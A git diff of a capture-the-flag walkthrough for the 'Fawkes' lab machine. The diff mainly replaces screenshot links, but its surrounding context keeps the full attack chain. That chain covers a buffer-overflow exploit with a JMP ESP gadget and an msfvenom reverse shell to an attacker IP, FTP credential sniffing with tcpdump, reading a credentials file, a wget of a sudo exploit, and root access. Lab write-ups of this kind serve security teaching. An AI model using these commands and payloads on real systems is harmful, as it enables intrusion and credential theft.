@@ -13,7 +13,7 @@
 
 An initial nmap scan was run to discover the target IP and identify open ports.
 
-![Initial nmap scan results](fawkes_screenshots/01_nmap_initial.png)
+<img width="1532" height="744" alt="initialnmapscan" src="https://github.com/user-attachments/assets/93135760-bfc8-49ed-ba96-cbd68ea0fd58" />
 
 The following ports were found open:
 
@@ -32,7 +32,8 @@ export ip=192.168.56.104
 
 A targeted scan was run against the discovered ports to enumerate services and versions.
 
-![Service version scan results](fawkes_screenshots/02_nmap_services.png)
+<img width="1564" height="707" alt="nmapscan1" src="https://github.com/user-attachments/assets/24873379-881a-418f-bcb7-28439b492ec3" />
+<img width="1562" height="765" alt="nmapscan2" src="https://github.com/user-attachments/assets/bb079954-feec-4955-924d-eb7bb2fc5388" />
 
 Several interesting findings:
 
@@ -49,7 +50,7 @@ Netcat was used to interact directly with the service on port 9898.
 nc $ip 9898
 ```
 
-![Netcat connection to port 9898](fawkes_screenshots/03_netcat_9898.png)
+<img width="1535" height="767" alt="netcat" src="https://github.com/user-attachments/assets/75e1017d-575d-45b1-b5c8-f20bef54a231" />
 
 As suspected, the service accepts user input. This raises the possibility of a buffer overflow vulnerability, which will be investigated after further enumeration.
 
@@ -65,7 +66,7 @@ ftp $ip
 # password: (blank)
 ```
 
-![FTP anonymous login](fawkes_screenshots/04_ftp_login.png)
+<img width="1542" height="394" alt="ftpsignin" src="https://github.com/user-attachments/assets/30bf73b5-4281-4f2e-9728-85a472f07102" />
 
 Login was successful. The directory contained a single file, `server_hogwarts`, which was downloaded.
 
@@ -85,7 +86,8 @@ The downloaded file was analysed to determine what it is.
 file server_hogwarts
 ```
 
-![file command output](fawkes_screenshots/05_file_command.png)
+<img width="1486" height="651" alt="getserver" src="https://github.com/user-attachments/assets/d083e1ed-6dc1-4e4e-9f6e-c1127682a468" />
+<img width="1553" height="355" alt="file" src="https://github.com/user-attachments/assets/512279fa-aa40-4f9c-8504-f907d4fa2762" />
 
 It is a 32-bit Linux ELF executable.
 
@@ -97,7 +99,8 @@ All human-readable strings embedded in the binary were dumped.
 strings server_hogwarts
 ```
 
-![strings output](fawkes_screenshots/06_strings_output.png)
+<img width="309" height="80" alt="stringdump" src="https://github.com/user-attachments/assets/85a1cba4-ddad-4bd5-b553-74e4e30c4600" />
+<img width="140" height="84" alt="strcpy" src="https://github.com/user-attachments/assets/664219d1-fe71-497f-96e4-a2514c32f0dd" />
 
 `strcpy` was identified in the output. This confirms the possibility of a buffer overflow attack — `strcpy` copies user input into a buffer without checking the size, meaning oversized input can overwrite adjacent memory.
 
@@ -109,6 +112,7 @@ The binary was made executable and run locally.
 chmod +x server_hogwarts
 ./server_hogwarts
 ```
+<img width="565" height="309" alt="runningfile" src="https://github.com/user-attachments/assets/b43d8b57-6853-48a1-98fa-617c33c9aca4" />
 
 It began listening on port 9898 — confirming it is the same application running on the target. This means the exploit can be developed and tested locally before being used against the target.
 
@@ -120,7 +124,7 @@ It began listening on port 9898 — confirming it is the same application runnin
 
 A large input was sent to the running binary to test for a crash.
 
-![Buffer overflow crash confirmation](fawkes_screenshots/07_bof_crash.png)
+<img width="1345" height="732" alt="crashconfirmed" src="https://github.com/user-attachments/assets/83f48b7b-ff4e-4385-b1ba-74f8873c6631" />
 
 A segmentation fault was observed, confirming the buffer overflow vulnerability.
 
@@ -138,9 +142,11 @@ The generated pattern was sent to the binary running under GDB. The resulting EI
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x64413764
 ```
 
-![GDB crash showing EIP value](fawkes_screenshots/08_gdb_eip.png)
+<img width="1607" height="811" alt="gdbandmetasploit" src="https://github.com/user-attachments/assets/8c3ef932-726d-459d-9433-1e16893d59ca" />
 
 **Offset: 112 bytes**
+
+<img width="765" height="316" alt="offset" src="https://github.com/user-attachments/assets/54ad9867-bd4d-4edb-90d8-3a5f82c09c7a" />
 
 ### Step 3 — Confirming EIP Control
 
@@ -150,7 +156,7 @@ The generated pattern was sent to the binary running under GDB. The resulting EI
 python3 -c "print('A' * 112 + 'BBBB')" | nc 127.0.0.1 9898
 ```
 
-![EIP showing 0x42424242](fawkes_screenshots/09_eip_control.png)
+<img width="1642" height="721" alt="eipcontrolconfirmation" src="https://github.com/user-attachments/assets/2cfaf0f4-e6a2-40d9-af85-4cd7e4dc2827" />
 
 GDB reported EIP as `0x42424242` (the hex value of `BBBB`), confirming full control of the instruction pointer.
 
@@ -162,7 +168,7 @@ A JMP ESP gadget was located inside the binary using `objdump`.
 objdump -d server_hogwarts | grep -i "jmp.*esp"
 ```
 
-![JMP ESP gadget address](fawkes_screenshots/10_jmp_esp.png)
+<img width="838" height="328" alt="gadget" src="https://github.com/user-attachments/assets/77ccf987-b199-4883-b02c-ccfcb1c4fa60" />
 
 The gadget was found at address **0x8049d55** (`ff e4` is the machine code for `JMP ESP`). In little-endian byte order this becomes `\x55\x9d\x04\x08`.
 
@@ -174,7 +180,7 @@ A reverse shell payload was generated with msfvenom, excluding null bytes which 
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -b "\x00" -f python
 ```
 
-![msfvenom shellcode generation](fawkes_screenshots/11_msfvenom.png)
+<img width="826" height="632" alt="gneratepayload" src="https://github.com/user-attachments/assets/b18edea8-d24e-4faa-a097-450df2e9754b" />
 
 ### Step 6 — Building and Firing the Exploit
 
@@ -196,15 +202,19 @@ s.send(payload)
 s.close()
 ```
 
+<img width="1121" height="704" alt="newpayload" src="https://github.com/user-attachments/assets/baf55ed6-0a71-4158-b841-0b45dd82fde9" />
+
 A netcat listener was set up before firing:
 
 ```bash
 nc -lvnp 4444
 ```
 
-![Reverse shell received](fawkes_screenshots/12_shell_received.png)
+<img width="1849" height="596" alt="fawkeshell" src="https://github.com/user-attachments/assets/eea8e409-f96e-42ab-a401-c9d4076f4040" />
 
 A shell was received. `id` and `whoami` confirmed the session was running as `harry`.
+
+<img width="931" height="385" alt="inasharry" src="https://github.com/user-attachments/assets/1603abd9-cb4c-4ef7-a838-6191d5b05b90" />
 
 ---
 
@@ -216,8 +226,7 @@ The hostname and OS version were checked to confirm the environment.
 hostname
 cat /etc/os-release
 ```
-
-![Docker container confirmation](fawkes_screenshots/13_docker_container.png)
+<img width="914" height="385" alt="hostname" src="https://github.com/user-attachments/assets/a5683b3c-d1a4-4fe1-b32c-cf1f8fb9bfde" />
 
 The random hex hostname and Alpine Linux OS confirmed that this shell is inside a Docker container, not the host OS.
 
@@ -233,7 +242,7 @@ Harry's home directory contained a `.mycreds.txt` file with credentials.
 cat ~/.mycreds.txt
 ```
 
-![mycreds.txt contents](fawkes_screenshots/14_mycreds.png)
+<img width="846" height="325" alt="FounCredentials" src="https://github.com/user-attachments/assets/399f7d44-1d09-4883-890d-0b29795a1521" />
 
 ### SSH into the Container
 
@@ -242,6 +251,8 @@ The credentials were used to SSH into the container's SSH service on port 2222.
 ```bash
 ssh harry@192.168.56.104 -p 2222
 ```
+
+<img width="806" height="602" alt="sshin" src="https://github.com/user-attachments/assets/071d4d33-05f1-4ca6-8e3b-cfd27aef4dad" />
 
 ### Escalating to Root Inside the Container
 
@@ -257,7 +268,7 @@ Since Alpine Linux does not have bash, `ash` was used instead:
 sudo /bin/ash
 ```
 
-![Root shell inside container](fawkes_screenshots/15_container_root.png)
+<img width="802" height="306" alt="rootaccess" src="https://github.com/user-attachments/assets/2b4adcf3-f7da-4368-a943-460559ff32aa" />
 
 Root access was obtained inside the container.
 
@@ -266,6 +277,8 @@ Root access was obtained inside the container.
 ```bash
 cat /root/horcrux1.txt
 ```
+
+<img width="817" height="539" alt="firsthorcrux+note" src="https://github.com/user-attachments/assets/f99f13fd-3834-424a-a922-175cb480dfa9" />
 
 **horcrux_{NjogSGFSclkgUG90VGVyIGRFc1RyT3llZCBieSB2b2xEZU1vclQ=}**
 
@@ -283,13 +296,15 @@ The available network interfaces were checked.
 ip a
 ```
 
+<img width="752" height="322" alt="NetworkInterfaces" src="https://github.com/user-attachments/assets/a40bc88d-1a4e-45ad-b461-be7081530c7c" />
+
 The container is on `172.17.0.2`, meaning the host is at `172.17.0.1`. `tcpdump` was used to sniff FTP traffic on `eth0`.
 
 ```bash
 tcpdump -i eth0 port 21 -A
 ```
 
-![tcpdump FTP credentials](fawkes_screenshots/16_tcpdump_creds.png)
+<img width="823" height="319" alt="passwordanduser" src="https://github.com/user-attachments/assets/907baa91-d10b-4a9d-b67b-b73b0ecd256d" />
 
 The capture revealed plaintext FTP credentials being sent repeatedly from the host:
 
@@ -308,7 +323,7 @@ The captured credentials were used to SSH into the real host on port 22.
 ssh neville@192.168.56.104 -p 22
 ```
 
-![SSH login as neville](fawkes_screenshots/17_neville_ssh.png)
+<img width="753" height="255" alt="logeedinasneville" src="https://github.com/user-attachments/assets/a655dd7c-651e-4e8d-97a3-1076eab48075" />
 
 ### Horcrux 2
 
@@ -317,6 +332,8 @@ The second horcrux was found in neville's home directory.
 ```bash
 cat /home/neville/horcrux2.txt
 ```
+
+<img width="714" height="146" alt="2ndhorcrux" src="https://github.com/user-attachments/assets/71f43a93-fb48-4927-b26a-183d3a7bf1a4" />
 
 **horcrux_{NzogTmFHaU5pIHRIZSBTbkFrZSBkZVN0cm9ZZWQgQnkgTmVWaWxsZSBMb25HYm9UVG9t}**
 
@@ -351,6 +368,8 @@ On Fawkes:
 wget http://192.168.56.101:8080/exploit_nss.py
 ```
 
+<img width="1843" height="678" alt="exploitdownload" src="https://github.com/user-attachments/assets/6e118f4f-7791-46b4-a336-2929e252fa23" />
+
 ### Running the Exploit
 
 The sudo path was corrected in the script to match the target system (`/usr/local/bin/sudo`), then the exploit was run.
@@ -359,7 +378,8 @@ The sudo path was corrected in the script to match the target system (`/usr/loca
 python3 exploit_nss.py
 ```
 
-![Baron Samedit root shell](fawkes_screenshots/18_root_shell.png)
+<img width="427" height="140" alt="gotin" src="https://github.com/user-attachments/assets/955d6c77-8962-44c4-8b47-1c8d25c5729f" />
+
 
 Root access was obtained on the host.
 
@@ -368,6 +388,7 @@ Root access was obtained on the host.
 ```bash
 cat /root/horcrux3.txt
 ```
+<img width="787" height="664" alt="finalhorcrux" src="https://github.com/user-attachments/assets/03f29509-6399-4ed4-a9d9-5cbd1df733f0" />
 
 **horcrux_{ODogVm9sRGVNb3JUIGRFZmVBdGVkIGJZIGhBcnJZIFBvVFRlUg==}**
 
